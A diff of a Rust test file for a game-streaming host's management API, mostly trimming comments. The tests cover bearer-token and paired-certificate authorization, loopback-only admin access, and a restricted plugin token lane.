@@ -1,11 +1,8 @@
-//! Handler + auth tests for the management API, exercised through `app()`. Split out of the
-//! `mgmt` facade (plan §W5).
+//! Handler + auth tests for the management API, exercised through `app()`.
 
-/// The published endpoint line has to satisfy TWO parsers written independently: systemd
-/// (`EnvironmentFile=`) and `windows::service::read_env_file_value`. This pins the shape both need
-/// — one `KEY=VALUE` line — and re-implements the Windows reader's split, so a change to the format
-/// fails here rather than silently pointing the console at the wrong port on the one platform CI
-/// cannot exercise.
+/// Pins the published `KEY=VALUE` line against both consumers: systemd `EnvironmentFile=`
+/// and `windows::service::read_env_file_value`. Re-implements the Windows split so a format
+/// change fails here rather than on the platform CI cannot run.
 #[test]
 fn published_endpoint_line_parses_the_way_both_consumers_read_it() {
     let dir = std::env::temp_dir().join(format!(
@@ -20,7 +17,6 @@ fn published_endpoint_line_parses_the_way_both_consumers_read_it() {
     let contents = std::fs::read_to_string(&path).unwrap();
     assert_eq!(contents, "PUNKTFUNK_MGMT_URL=https://127.0.0.1:47991\n");
 
-    // `read_env_file_value`'s exact logic: first non-blank line, split once on '=', take the value.
     let line = contents
         .lines()
         .find(|l| !l.trim().is_empty())
@@ -28,10 +24,8 @@ fn published_endpoint_line_parses_the_way_both_consumers_read_it() {
         .trim();
     let value = line.split_once('=').map_or(line, |(_, v)| v).trim();
     assert_eq!(value, "https://127.0.0.1:47991");
-    // The value must survive that split intact — i.e. carry no '=' of its own.
     assert!(!value.contains('='));
-    // Loopback whatever the listener binds: the console proxies over loopback by design, so a wide
-    // 0.0.0.0 bind must never be echoed here as a LAN URL.
+    // Loopback whatever the listener binds: a 0.0.0.0 bind must never be echoed as a LAN URL.
     assert!(value.starts_with("https://127.0.0.1:"));
 
     let _ = std::fs::remove_dir_all(&dir);
@@ -50,7 +44,7 @@ use sha2::{Digest, Sha256};
 use std::sync::atomic::Ordering;
 use tower::ServiceExt;
 
-/// A throwaway client-logs dir (same shape as [`test_stats`] — never the real config dir).
+/// Unique temp dir; never the host config dir.
 fn test_client_logs_dir() -> std::path::PathBuf {
     std::env::temp_dir().join(format!(
         "pf-mgmt-clientlogs-{}-{:p}",
@@ -59,7 +53,7 @@ fn test_client_logs_dir() -> std::path::PathBuf {
     ))
 }
 
-/// A throwaway stats recorder rooted in a unique temp dir (never touches the real config dir).
+/// Unique temp dir; never the host config dir.
 fn test_stats() -> Arc<crate::stats_recorder::StatsRecorder> {
     crate::stats_recorder::StatsRecorder::new(std::env::temp_dir().join(format!(
         "pf-mgmt-stats-{}-{:p}",
@@ -88,28 +82,25 @@ fn test_state() -> Arc<AppState> {
     }
 }
 
-// The mgmt API now always requires auth, so the router always has a token. A test that passes
-// `None` gets the default "test-secret" (and `send` auto-attaches the matching bearer); a test
-// that passes an explicit token exercises a mismatch (e.g. `bearer_token_is_enforced`).
+// `None` installs "test-secret" (`send` attaches the matching bearer). An explicit token
+// is for mismatch cases such as `bearer_token_is_enforced`.
 fn test_app(state: Arc<AppState>, token: Option<&str>) -> Router {
     let stats = state.stats.clone();
     app(
         state,
         Some(token.unwrap_or("test-secret").to_string()),
-        // The scoped plugin lane, exercised by the `plugin_token_*` tests below.
         Some("plugin-secret".to_string()),
         DEFAULT_PORT,
         None,
         stats,
         test_client_logs_dir(),
-        // GameStream-compat planes off (the secure default the native-only tests model).
+        // GameStream-compat off: the native-only default these tests model.
         false,
     )
 }
 
 fn test_app_native(state: Arc<AppState>, np: Arc<crate::native_pairing::NativePairing>) -> Router {
-    // Auth required always; the paired-cert tests inject a fingerprint (cert branch wins), the
-    // rest authenticate via the `send`-attached default bearer.
+    // Paired-cert tests inject a fingerprint (cert branch wins); others use `send`'s bearer.
     let stats = state.stats.clone();
     app(
         state,
@@ -124,9 +115,7 @@ fn test_app_native(state: Arc<AppState>, np: Arc<crate::native_pairing::NativePa
 }
 
 async fn send(app: &Router, mut req: axum::http::Request<Body>) -> (StatusCode, serde_json::Value) {
-    // Auto-attach the default bearer unless the test set its own Authorization (e.g. the
-    // mismatch cases in `bearer_token_is_enforced`). Open routes ignore it; authed routes
-    // accept it against the `test-secret` default token.
+    // Attach the default bearer unless the test set Authorization (mismatch cases).
     if !req
         .headers()
         .contains_key(axum::http::header::AUTHORIZATION)
@@ -151,19 +140,16 @@ fn get_req(path: &str) -> axum::http::Request<Body> {
     axum::http::Request::get(path).body(Body::empty()).unwrap()
 }
 
-/// Send a request authenticated ONLY by a paired streaming cert (the `PeerCertFingerprint`
-/// `serve_https` would attach) — no bearer header — so `require_auth`'s cert branch decides.
+/// Cert-only: inject `PeerCertFingerprint` and omit the bearer so `require_auth` takes the cert branch.
 async fn send_cert(app: &Router, mut req: axum::http::Request<Body>, fp: &str) -> StatusCode {
     req.extensions_mut()
         .insert(PeerCertFingerprint(Some(fp.to_string())));
     app.clone().oneshot(req).await.expect("infallible").status()
 }
 
-/// The host-actions surface (design/host-actions.md): discovery reports `permitted` per caller
-/// from the device's LIVE mask; invoke 403s without the Power grant and 404s an unknown id.
-/// An explicitly stored pre-power "Full control" (`0x3F`) carries Power via the legacy-full
-/// read rule (§4.3). Deliberately NO test ever reaches a 202 accept — on a real box that
-/// would genuinely suspend it.
+/// Discovery reports `permitted` from the live grant mask; invoke 403s without Power and 404s an unknown id.
+/// Stored pre-power "Full control" (`GRANT_ALL_PRE_POWER`) still carries Power.
+/// Never drive a 202: that would actually suspend the box.
 #[tokio::test]
 async fn host_actions_follow_the_power_grant() {
     use punktfunk_core::quic::{GRANT_ALL_PRE_POWER, GRANT_GAMEPAD};
@@ -187,12 +173,12 @@ async fn host_actions_follow_the_power_grant() {
         }),
     )
     .unwrap();
-    np.add("owner", owner_fp).unwrap(); // absent grants = full control, Power included
+    np.add("owner", owner_fp).unwrap(); // absent grants = full control, including Power
     np.add_with_access(
         "legacy",
         legacy_fp,
         Some(crate::native_pairing::Access {
-            grants: GRANT_ALL_PRE_POWER, // an explicit pre-power "Full control"
+            grants: GRANT_ALL_PRE_POWER,
             expires_unix: None,
         }),
     )
@@ -224,7 +210,7 @@ async fn host_actions_follow_the_power_grant() {
             "full control (current or legacy-stored) carries Power: {body}"
         );
     }
-    // The admin bearer (no cert) sees everything permitted — the console is the owner surface.
+    // Admin bearer without a cert is the console/owner surface: everything permitted.
     let (_, body) = send(&app, get_req("/api/v1/actions")).await;
     assert!(body["actions"]
         .as_array()
@@ -233,19 +219,18 @@ async fn host_actions_follow_the_power_grant() {
         .all(|a| a["permitted"] == true));
 
     let post = |path: &str| axum::http::Request::post(path).body(Body::empty()).unwrap();
-    // Invoke without the grant: the typed 403, distinct from unpaired (which never gets here).
+    // Typed 403 without the grant; unpaired never reaches this handler.
     assert_eq!(
         send_cert(&app, post("/api/v1/actions/power.sleep"), guest_fp).await,
         StatusCode::FORBIDDEN,
         "no Power bit ⇒ 403"
     );
-    // Unknown id: 404, before any permission or platform question.
+    // Unknown id 404s before grant or platform checks.
     let (status, _) = send(&app, post("/api/v1/actions/no.such")).await;
     assert_eq!(status, StatusCode::NOT_FOUND);
 }
 
-/// A paired *streaming* cert (mTLS, no bearer) authorizes only the read-only allowlist; every
-/// state-changing or PIN-exposing route still requires the operator's bearer token (audit #4).
+/// A paired streaming cert reaches only the read-only allowlist; PIN and mutating routes need the operator bearer.
 #[tokio::test]
 async fn cert_auth_is_a_read_only_allowlist() {
     let np = Arc::new(
@@ -260,7 +245,6 @@ async fn cert_auth_is_a_read_only_allowlist() {
     np.add("streaming-client", fp).unwrap();
     let app = test_app_native(test_state(), np);
 
-    // Allowlisted read-only GETs → the cert authorizes them (not 401).
     for p in [
         "/api/v1/host",
         "/api/v1/status",
@@ -273,8 +257,7 @@ async fn cert_auth_is_a_read_only_allowlist() {
             "a paired streaming cert should authorize GET {p}"
         );
     }
-    // The paired-client ROSTERS are token-only: one paired cert must NOT be able to enumerate every
-    // other paired device's name + fingerprint (security-review 2026-07-17).
+    // Roster GETs are token-only: one cert must not list every other device's name + fingerprint.
     for p in ["/api/v1/clients", "/api/v1/native/clients"] {
         assert_eq!(
             send_cert(&app, get_req(p), fp).await,
@@ -282,15 +265,12 @@ async fn cert_auth_is_a_read_only_allowlist() {
             "the client roster {p} must require the bearer token, not just a paired cert"
         );
     }
-    // The scanner settings are admin-only in BOTH directions: the exact-path `/api/v1/library`
-    // cert match must not leak the settings GET, and the toggle PUT is operator configuration.
+    // Exact `/api/v1/library` cert match must not leak `/library/scanners`.
     assert_eq!(
         send_cert(&app, get_req("/api/v1/library/scanners"), fp).await,
         StatusCode::UNAUTHORIZED,
         "the scanner settings must require the bearer token, not just a paired cert"
     );
-    // The plugin directory is admin-only — a paired streaming cert has no business enumerating the
-    // host's running plugins or reaching a plugin UI's proxy credential (plugin-ui-surface §3).
     for p in [
         "/api/v1/plugins",
         "/api/v1/plugins/rom-manager/ui-credential",
@@ -301,7 +281,6 @@ async fn cert_auth_is_a_read_only_allowlist() {
             "the plugin directory {p} must require the bearer token, not just a paired cert"
         );
     }
-    // PIN-exposing GET + state-changing routes → token-only (cert rejected without a bearer).
     assert_eq!(
         send_cert(&app, get_req("/api/v1/native/pair"), fp).await,
         StatusCode::UNAUTHORIZED,
@@ -332,7 +311,6 @@ async fn cert_auth_is_a_read_only_allowlist() {
         StatusCode::UNAUTHORIZED,
         "unpair (DELETE) must require the bearer token"
     );
-    // An UNPAIRED cert is rejected even on an allowlisted path.
     assert_eq!(
         send_cert(&app, get_req("/api/v1/status"), "not-paired").await,
         StatusCode::UNAUTHORIZED,
@@ -340,16 +318,14 @@ async fn cert_auth_is_a_read_only_allowlist() {
     );
 }
 
-/// The bearer-token (admin) path is honored only from a LOOPBACK peer: the same token from a LAN
-/// peer is rejected, so binding the listener to all interfaces (so paired clients can browse the
-/// library by default) never LAN-exposes the admin surface. A paired *cert*, by contrast, reaches
-/// the read-only allowlist from anywhere.
+/// Admin bearer is loopback-only so an all-interfaces bind never LAN-exposes the console token.
+/// A paired cert still reaches the read-only allowlist from a LAN peer.
 #[tokio::test]
 async fn bearer_admin_is_loopback_only() {
     let lan: SocketAddr = "192.168.1.50:54321".parse().unwrap();
     let loopback: SocketAddr = "127.0.0.1:33333".parse().unwrap();
     let bearer = |peer: SocketAddr| {
-        let mut req = get_req("/api/v1/stats/recordings"); // a bearer-only (admin) route
+        let mut req = get_req("/api/v1/stats/recordings"); // bearer-only admin route
         req.extensions_mut().insert(PeerAddr(peer));
         req.headers_mut().insert(
             axum::http::header::AUTHORIZATION,
@@ -359,7 +335,6 @@ async fn bearer_admin_is_loopback_only() {
     };
 
     let app = test_app(test_state(), None);
-    // A valid bearer from a LAN peer → rejected on the admin API.
     assert_eq!(
         app.clone()
             .oneshot(bearer(lan))
@@ -369,7 +344,6 @@ async fn bearer_admin_is_loopback_only() {
         StatusCode::UNAUTHORIZED,
         "a bearer token from a LAN peer must be rejected on the admin API"
     );
-    // The SAME token from a loopback peer (the web console BFF) → accepted.
     assert_ne!(
         app.clone()
             .oneshot(bearer(loopback))
@@ -380,7 +354,6 @@ async fn bearer_admin_is_loopback_only() {
         "the bearer token must be accepted from a loopback peer"
     );
 
-    // A paired cert from a LAN peer still reaches the read-only library (the feature this enables).
     let np = Arc::new(
         crate::native_pairing::NativePairing::load_with(
             Some(std::env::temp_dir().join(format!("pf-mgmt-lanlib-{}.json", std::process::id()))),
@@ -402,10 +375,8 @@ async fn bearer_admin_is_loopback_only() {
         "a paired cert must reach the library from a LAN peer"
     );
 
-    // The per-image art proxy (`/api/v1/library/art/{id}/{kind}`) is a prefix match in
-    // `cert_may_access`, not an exact one (dynamic id/kind segments) — exercise it directly. An
-    // unknown `kind` 404s before any disk/network I/O, so this stays a fast, deterministic check
-    // of the auth gate (not of art resolution, which `library::tests` covers).
+    // Art proxy is a prefix match in `cert_may_access` (dynamic id/kind). Unknown kind 404s
+    // before I/O, so this is the auth gate, not art resolution (`library::tests`).
     let mut req = get_req("/api/v1/library/art/steam:570/not-a-real-kind");
     req.extensions_mut().insert(PeerAddr(lan));
     req.extensions_mut()
@@ -427,12 +398,10 @@ async fn health_is_open_and_versioned() {
     assert_eq!(body["abi_version"], punktfunk_core::ABI_VERSION);
 }
 
-/// Serializes the tests that read (or write) the process-global live-session registry
-/// ([`crate::session_status`]): a session registered by one test would otherwise make a
-/// concurrently running one see a stream it never started.
+/// Serializes tests that touch the process-global live-session registry
+/// ([`crate::session_status`]); otherwise one test's session leaks into another.
 static SESSION_REGISTRY_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());
 
-/// A `/local/summary` request from a loopback peer (the tray's own).
 fn summary_req() -> axum::http::Request<Body> {
     let mut req = get_req("/api/v1/local/summary");
     req.extensions_mut()
@@ -440,7 +409,6 @@ fn summary_req() -> axum::http::Request<Body> {
     req
 }
 
-/// Registers a stand-in live native session; the returned guard removes it on drop.
 fn fake_native_session(
     width: u32,
     height: u32,
@@ -459,15 +427,13 @@ fn fake_native_session(
         hdr: false,
         ttff_ms: Arc::new(std::sync::atomic::AtomicU32::new(0)),
         last_resize_ms: Arc::new(std::sync::atomic::AtomicU32::new(0)),
-        // No launch: a desktop stream, which must show no game row.
+        // Desktop stream: no game row.
         game: None,
     })
 }
 
-/// A native (punktfunk/1) session — the DEFAULT plane — must read as streaming in the tray's
-/// summary. The GameStream `streaming` flag stays false throughout such a session, and reading it
-/// alone left the tray showing "idle" (with the idle icon) for the whole stream: exactly the blind
-/// spot `/status` was fixed for in [`crate::session_status`], which `/local/summary` still had.
+/// A native session must read as streaming in `/local/summary`. The GameStream `streaming` flag
+/// stays false for the whole native stream, so the tray must not key off that flag alone.
 #[tokio::test]
 async fn local_summary_reports_a_native_session_as_streaming() {
     let _serial = SESSION_REGISTRY_LOCK.lock().await;
@@ -485,11 +451,9 @@ async fn local_summary_reports_a_native_session_as_streaming() {
     assert_eq!(body["session"]["width"], 3840);
     assert_eq!(body["session"]["height"], 2160);
     assert_eq!(body["session"]["fps"], 120);
-    // The STREAMING client's display name rides along (the tray's connect toast); see the
-    // non-sensitive test below for the idle-side guarantee.
+    // Live `client_name` is for the tray connect toast; idle-side is the next test.
     assert_eq!(body["client_name"], "studio-deck");
 
-    // Session over → back to idle, and the name goes with it.
     drop(session);
     let (_, body) = send(&app, summary_req()).await;
     assert_eq!(body["video_streaming"], false);
@@ -501,12 +465,9 @@ async fn local_summary_reports_a_native_session_as_streaming() {
     );
 }
 
-/// The tray's `/local/summary` is unauthenticated for LOOPBACK peers only — a LAN peer is
-/// rejected even though the route needs no bearer token, and the body never carries secret
-/// material (no PIN values, no fingerprints). The ONE name it may carry is the *streaming*
-/// client's display name (`client_name`, for the tray's connect toast) — a paired-but-idle
-/// device's name must still never appear, which is what this test pins (it pairs a device and
-/// registers NO session).
+/// `/local/summary` is unauthenticated for loopback only. The body must not carry PINs,
+/// fingerprints, or a paired-but-idle device's name. This test pairs a device and registers
+/// no session so `client_name` stays absent.
 #[tokio::test]
 async fn local_summary_is_loopback_only_and_non_sensitive() {
     let _serial = SESSION_REGISTRY_LOCK.lock().await;
@@ -521,7 +482,6 @@ async fn local_summary_is_loopback_only_and_non_sensitive() {
     np.add("secret-device-name", "deadbeefcafe0123").unwrap();
     let app = test_app_native(test_state(), np);
 
-    // Loopback peer, NO auth header → 200 with the expected shape.
     let mut req = get_req("/api/v1/local/summary");
     req.extensions_mut()
         .insert(PeerAddr("127.0.0.1:40000".parse().unwrap()));
@@ -531,14 +491,12 @@ async fn local_summary_is_loopback_only_and_non_sensitive() {
     assert_eq!(body["native_paired_clients"], 1);
     assert_eq!(body["pending_approvals"], 0);
     assert!(body["version"].is_string());
-    // No secret material anywhere in the body (paired name / fingerprint must not leak).
     let raw = body.to_string();
     assert!(
         !raw.contains("deadbeefcafe0123") && !raw.contains("secret-device-name"),
         "summary must not leak fingerprints or device names: {raw}"
     );
 
-    // The same request from a LAN peer → rejected (route is loopback-gated, not just tokenless).
     let mut req = get_req("/api/v1/local/summary");
     req.extensions_mut()
         .insert(PeerAddr("192.168.1.50:40000".parse().unwrap()));
@@ -549,7 +507,6 @@ async fn local_summary_is_loopback_only_and_non_sensitive() {
         "the local summary must be rejected for a LAN peer"
     );
 
-    // IPv6 loopback counts as loopback.
     let mut req = get_req("/api/v1/local/summary");
     req.extensions_mut()
         .insert(PeerAddr("[::1]:40000".parse().unwrap()));
@@ -561,7 +518,6 @@ async fn local_summary_is_loopback_only_and_non_sensitive() {
 async fn bearer_token_is_enforced() {
     let app = test_app(test_state(), Some("sekrit"));
 
-    // No/wrong token → 401 with the error envelope.
     let (status, body) = send(&app, get_req("/api/v1/status")).await;
     assert_eq!(status, StatusCode::UNAUTHORIZED);
     assert!(body["error"].as_str().unwrap().contains("bearer"));
@@ -571,14 +527,12 @@ async fn bearer_token_is_enforced() {
         .unwrap();
     assert_eq!(send(&app, wrong).await.0, StatusCode::UNAUTHORIZED);
 
-    // Right token → 200.
     let right = axum::http::Request::get("/api/v1/status")
         .header("authorization", "Bearer sekrit")
         .body(Body::empty())
         .unwrap();
     assert_eq!(send(&app, right).await.0, StatusCode::OK);
 
-    // Health + the spec/docs stay open.
     assert_eq!(
         send(&app, get_req("/api/v1/health")).await.0,
         StatusCode::OK
@@ -596,13 +550,11 @@ async fn bearer_token_is_enforced() {
     );
 }
 
-/// The pure route gate for the plugin lane: exclusion-based, so spot-check both sides — the
-/// surface a plugin legitimately uses, and every escalation carve-out.
+/// Spot-check `plugin_may_access`: the plugin surface stays open, escalation routes stay closed.
 #[test]
 fn plugin_allowlist_excludes_escalation_routes() {
     use axum::http::Method;
 
-    // The legitimate plugin surface stays open (including mutations — sessions, library, leases).
     assert!(auth::plugin_may_access(&Method::GET, "/api/v1/status"));
     assert!(auth::plugin_may_access(&Method::GET, "/api/v1/library"));
     assert!(auth::plugin_may_access(&Method::GET, "/api/v1/clients"));
@@ -616,11 +568,10 @@ fn plugin_allowlist_excludes_escalation_routes() {
         "/api/v1/plugins/rom-manager"
     ));
 
-    // Hooks: registration is command execution; even the read can expose webhook credentials.
+    // Hooks: write is command execution; even the GET can expose webhook credentials.
     assert!(!auth::plugin_may_access(&Method::GET, "/api/v1/hooks"));
     assert!(!auth::plugin_may_access(&Method::PUT, "/api/v1/hooks"));
 
-    // Pairing administration + PIN visibility.
     assert!(!auth::plugin_may_access(&Method::GET, "/api/v1/pair"));
     assert!(!auth::plugin_may_access(&Method::POST, "/api/v1/pair/pin"));
     assert!(!auth::plugin_may_access(
@@ -654,10 +605,8 @@ fn plugin_allowlist_excludes_escalation_routes() {
         "/api/v1/plugins/x/ui-credential"
     ));
 
-    // The plugin STORE, wholesale. Installing a plugin runs new code with operator privileges, so a
-    // plugin able to do it could install a helper that isn't constrained the way it is — and
-    // `POST /store/runtime` would let it switch its own supervisor. Denied by whole-prefix so a
-    // route added here later is denied by default rather than by remembering to list it.
+    // Store prefix: install runs new code as the operator; `POST /store/runtime` would switch
+    // this plugin's supervisor. Whole-prefix so a later route is denied by default.
     for path in [
         "/api/v1/store/catalog",
         "/api/v1/store/installed",
@@ -684,11 +633,8 @@ fn plugin_allowlist_excludes_escalation_routes() {
         );
     }
 
-    // The update surface, wholesale: today a check, tomorrow `apply` (an installer / the root
-    // helper) — operator business end to end, denied by whole-prefix so the apply route added in
-    // U1/U2 is denied by default rather than by remembering to list it. And it is deliberately
-    // NOT on the paired-cert allowlist either: a streaming client has no business knowing or
-    // steering the host's update state.
+    // Update prefix: `apply` is an installer / root helper. Whole-prefix, and not on the
+    // paired-cert allowlist either.
     for path in [
         "/api/v1/update",
         "/api/v1/update/status",
@@ -716,16 +662,14 @@ fn plugin_allowlist_excludes_escalation_routes() {
         &Method::DELETE,
         "/api/v1/store/sources/unom"
     ));
-    // …but a route that merely starts with the same letters is unaffected.
+    // A path that merely starts with the same letters is unaffected.
     assert!(auth::plugin_may_access(&Method::GET, "/api/v1/status"));
 }
 
-/// The plugin bearer lane end-to-end: scoped 403s on the carve-outs, 200s on the plugin surface,
-/// and the same loopback confinement as the admin token.
 #[tokio::test]
 async fn plugin_token_lane_is_scoped_and_loopback_only() {
     use axum::http::Method;
-    let app = test_app(test_state(), None); // admin "test-secret", plugin "plugin-secret"
+    let app = test_app(test_state(), None);
 
     let plugin_req = |method: Method, path: &str| {
         axum::http::Request::builder()
@@ -736,7 +680,6 @@ async fn plugin_token_lane_is_scoped_and_loopback_only() {
             .unwrap()
     };
 
-    // The plugin surface authenticates: status + the plugin directory (list and lease removal).
     assert_eq!(
         send(&app, plugin_req(Method::GET, "/api/v1/status"))
             .await
@@ -759,10 +702,8 @@ async fn plugin_token_lane_is_scoped_and_loopback_only() {
         StatusCode::NO_CONTENT
     );
 
-    // Log ingest. This is the ONLY token the scripting runner holds (on Windows its LocalService
-    // principal cannot even read the admin one), so if this lane ever stopped reaching this route
-    // the console's plugin logs would go quiet with nothing else failing — pin it here rather than
-    // rely on `plugin_may_access`'s denylist continuing to not match `/plugins/logs`.
+    // The runner's only token (Windows LocalService cannot read the admin one). Pin ingest
+    // here; do not rely on `plugin_may_access` continuing not to match `/plugins/logs`.
     let body = serde_json::json!({"entries": [{
         "ts_ms": 1_700_000_000_000u64,
         "level": "INFO",
@@ -776,7 +717,7 @@ async fn plugin_token_lane_is_scoped_and_loopback_only() {
         .unwrap();
     assert_eq!(send(&app, req).await.0, StatusCode::NO_CONTENT);
 
-    // The carve-outs answer 403 (authenticated but not authorized), not 401.
+    // Carve-outs are 403 (authenticated but not authorized), not 401.
     #[cfg_attr(not(feature = "gamestream"), allow(unused_mut))]
     let mut carveouts = vec![
         (Method::GET, "/api/v1/hooks"),
@@ -785,14 +726,13 @@ async fn plugin_token_lane_is_scoped_and_loopback_only() {
         (Method::GET, "/api/v1/native/pending"),
         (Method::DELETE, "/api/v1/clients/aabbcc"),
         (Method::GET, "/api/v1/plugins/x/ui-credential"),
-        // The plugin store: a plugin must not be able to install plugins or switch its own runner.
         (Method::GET, "/api/v1/store/catalog"),
         (Method::POST, "/api/v1/store/install"),
         (Method::POST, "/api/v1/store/uninstall"),
         (Method::POST, "/api/v1/store/runtime"),
         (Method::PUT, "/api/v1/store/sources/evil"),
     ];
-    // The PIN route only exists in GameStream-featured builds (WP19).
+    // PIN route exists only in GameStream-featured builds.
     #[cfg(feature = "gamestream")]
     carveouts.push((Method::GET, "/api/v1/pair"));
     for (method, path) in carveouts {
@@ -801,14 +741,13 @@ async fn plugin_token_lane_is_scoped_and_loopback_only() {
         assert!(body["error"].as_str().unwrap().contains("plugin token"));
     }
 
-    // A wrong token never reaches the lane.
     let wrong = axum::http::Request::get("/api/v1/status")
         .header("authorization", "Bearer plugin-wrong")
         .body(Body::empty())
         .unwrap();
     assert_eq!(send(&app, wrong).await.0, StatusCode::UNAUTHORIZED);
 
-    // Loopback-only, exactly like the admin token: a LAN peer is refused before token compare.
+    // LAN peer is refused before token compare, same as the admin token.
     let mut lan = plugin_req(Method::GET, "/api/v1/status");
     lan.extensions_mut()
         .insert(PeerAddr("192.168.1.50:40000".parse().unwrap()));
@@ -822,15 +761,12 @@ async fn host_info_reports_identity_and_ports() {
     assert_eq!(status, StatusCode::OK);
     assert_eq!(body["hostname"], "test-host");
     assert_eq!(body["uniqueid"], "deadbeef");
-    // OS identity rides along verbatim from the detected Host (chain for the icon walk,
-    // pretty name for the human label).
+    // `os` is the icon-walk chain; `os_name` is the human label. Both copied from Host.
     assert_eq!(body["os"], "linux/arch/steamos");
     assert_eq!(body["os_name"], "SteamOS");
     assert_eq!(body["ports"]["http"], HTTP_PORT);
     assert_eq!(body["ports"]["mgmt"], DEFAULT_PORT);
-    // Codecs are GPU-aware (derived from `Codec::host_wire_caps`), so assert against that mask
-    // rather than a fixed set — and confirm HEVC serializes as "hevc" (the unified codec label),
-    // never "h265".
+    // Assert against `Codec::host_wire_caps`, not a fixed set. HEVC serializes as "hevc", never "h265".
     use punktfunk_core::quic::{CODEC_AV1, CODEC_H264, CODEC_HEVC, CODEC_PYROWAVE};
     let caps = Codec::host_wire_caps();
     let expected: Vec<&str> = [
@@ -845,7 +781,6 @@ async fn host_info_reports_identity_and_ports() {
     .collect();
     assert_eq!(body["codecs"], serde_json::json!(expected));
     assert!(caps & CODEC_H264 != 0, "H.264 is always encodable");
-    // test_app models the secure default (GameStream-compat off).
     assert_eq!(body["gamestream"], false);
 }
 
@@ -855,11 +790,9 @@ async fn compositors_lists_all_backends_with_flags() {
     let (status, body) = send(&app, get_req("/api/v1/compositors")).await;
     assert_eq!(status, StatusCode::OK);
     let arr = body.as_array().expect("array");
-    // Compositor backends are Linux-only; elsewhere the list is empty on purpose (the console
-    // renders "not applicable on this host" instead of five greyed-out rows).
+    // Compositors are Linux-only; elsewhere the list is empty so the console can say N/A.
     #[cfg(not(target_os = "linux"))]
     assert!(arr.is_empty(), "non-Linux hosts advertise no compositors");
-    // Every backend the host knows, in stable order.
     #[cfg(target_os = "linux")]
     {
         let ids: Vec<&str> = arr.iter().map(|c| c["id"].as_str().unwrap()).collect();
@@ -870,7 +803,7 @@ async fn compositors_lists_all_backends_with_flags() {
         assert!(c["default"].is_boolean());
         assert!(c["label"].as_str().is_some_and(|s| !s.is_empty()));
     }
-    // At most one backend is the auto-detect default (none, if the test env has no desktop).
+    // At most one auto-detect default; none if the test env has no desktop.
     assert!(arr.iter().filter(|c| c["default"] == true).count() <= 1);
 }
 
@@ -900,20 +833,14 @@ async fn status_reflects_runtime_state() {
     assert_eq!(body["video_streaming"], true);
     assert_eq!(body["session"]["width"], 2560);
     assert_eq!(body["session"]["fps"], 120);
-    // Key material must never appear anywhere in the response.
     assert!(!body.to_string().contains("gcm"));
 }
 
-/// Point `PUNKTFUNK_CONFIG_DIR` at a throwaway tempdir for the body of a test, and put the previous
-/// value back on drop even if an assertion panics.
+/// Overrides `PUNKTFUNK_CONFIG_DIR` for one test and restores it on drop, even on panic.
 ///
-/// ONE of these for the whole file on purpose. Mutating the process environment is safe to call and
-/// unsound from a live multithreaded process, so `check-unsafe-hygiene.sh` (gate C) holds this file
-/// to a fixed count of such call sites — and counts plain prose mentions too, deliberately, since
-/// its grep is the contract. A second test that copy-pastes the dance trips it, which is exactly
-/// what it is for. This also bundles the serialization: the lock is a FIELD, so it cannot be
-/// forgotten, and `Drop::drop` runs before any field drops, meaning the environment is restored
-/// while this still holds the lock.
+/// One helper for the whole file: `check-unsafe-hygiene.sh` greps this file for a fixed
+/// count of `set_var` sites (and prose mentions). The lock is a field so Drop restores
+/// the env while still holding it — fields drop after `Drop::drop`.
 struct ConfigDirOverride {
     tmp: tempfile::TempDir,
     prev: Option<std::ffi::OsString>,
@@ -933,8 +860,7 @@ impl ConfigDirOverride {
         ConfigDirOverride { tmp, prev, _serial }
     }
 
-    /// The throwaway config dir itself — used verbatim by `pf_paths`, with no `punktfunk`
-    /// subdirectory appended.
+    /// Config dir used verbatim by `pf_paths`; no `punktfunk` subdirectory is appended.
     fn path(&self) -> &std::path::Path {
         self.tmp.path()
     }
@@ -952,29 +878,23 @@ impl Drop for ConfigDirOverride {
     }
 }
 
-// Holding `CONFIG_DIR_TEST_LOCK` across the awaits is the POINT: the env override must cover
-// the whole test body, and `#[tokio::test]` is a single-threaded runtime — nothing else can
-// need the executor while we hold it.
+// The env override must cover the whole body. `#[tokio::test]` is single-threaded, so
+// nothing else needs the executor while we hold `CONFIG_DIR_TEST_LOCK`.
 #[allow(clippy::await_holding_lock)]
 #[tokio::test]
 async fn paired_clients_list_and_unpair() {
-    // Unpair PERSISTS (save_paired → paired.json in the config dir), so point the config dir
-    // at a throwaway tempdir — this test must never rewrite the dev box's real pairing store.
-    // The guard restores the previous value even if an assertion below panics.
+    // Unpair writes paired.json; the override keeps this off the real config dir.
     let tmp = ConfigDirOverride::new();
 
     let state = test_state();
     let app = test_app(state.clone(), None);
 
-    // Pin a throwaway cert DER as a stand-in client (the native ephemeral identity — CN
-    // "punktfunk" — so this works in both build flavors; WP19).
+    // Native ephemeral identity (CN "punktfunk") so both build flavors share a stand-in cert.
     let stand_in = crate::identity::ephemeral().unwrap();
     let (_, pem) = x509_parser::pem::parse_x509_pem(stand_in.cert_pem.as_bytes()).unwrap();
     let der = pem.contents.clone();
     let fingerprint = hex::encode(Sha256::digest(&der));
-    // Isolate from any real paired store on the dev box: AppState::new loads
-    // ~/.config/punktfunk/paired.json, so clear it before seeding our stand-in — otherwise
-    // a real GameStream-paired client lands at body[0] and this assertion sees its hash.
+    // `AppState::new` loads paired.json; clear before seeding so a real pairing never lands at [0].
     {
         let mut p = state.paired.lock().unwrap();
         p.clear();
@@ -987,18 +907,15 @@ async fn paired_clients_list_and_unpair() {
     assert_eq!(body[0]["fingerprint"], fingerprint);
     assert_eq!(body[0]["subject"], "CN=punktfunk");
 
-    // Malformed fingerprint → 400.
     let bad = axum::http::Request::delete("/api/v1/clients/zz")
         .body(Body::empty())
         .unwrap();
     assert_eq!(send(&app, bad).await.0, StatusCode::BAD_REQUEST);
 
-    // A LIVE session owned by this client: unpair is a revocation, so it must END the session,
-    // not just delist the cert — before this, a mid-stream client kept streaming after unpair
-    // until it chose to leave.
+    // Unpair is revocation: it must end this client's live session, not only delist the cert.
     {
         use std::sync::atomic::Ordering;
-        // owner_fp is the sha256 of the cert DER — exactly the bytes `fingerprint` encodes.
+        // owner_fp is the sha256 of the cert DER — the bytes `fingerprint` encodes.
         let mut owner = [0u8; 32];
         owner.copy_from_slice(&hex::decode(&fingerprint).unwrap());
         state.streaming.store(true, Ordering::SeqCst);
@@ -1014,7 +931,7 @@ async fn paired_clients_list_and_unpair() {
         });
     }
 
-    // Unpair (uppercase hex must match too) → 204, list empties, second delete → 404.
+    // Path is case-insensitive; uppercase hex must match too.
     let del = |fp: String| {
